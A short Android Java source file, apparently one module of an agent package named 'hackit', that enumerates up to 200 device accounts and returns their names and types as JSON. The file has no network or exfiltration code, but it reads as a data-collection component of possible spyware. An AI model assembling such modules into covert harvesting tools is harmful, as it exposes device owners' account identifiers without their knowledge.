package com.hackit.agent;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;

import org.json.JSONArray;
import org.json.JSONObject;

/** Account names per authenticator type (GET_ACCOUNTS is install-time). */
final class Accounts {
    static JSONArray dump(Context ctx) {
        JSONArray rows = new JSONArray();
        if (!Common.granted(ctx, android.Manifest.permission.GET_ACCOUNTS)) {
            return rows;
        }
        try {
            AccountManager manager = AccountManager.get(ctx);
            Account[] accounts = manager.getAccounts();
            for (Account account : accounts) {
                if (rows.length() >= 200) {
                    break;
                }
                JSONObject row = new JSONObject();
                row.put("name", account.name);
                row.put("type", account.type);
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.d("accounts: " + exc);
        }
        return rows;
    }

    private Accounts() {
    }
}
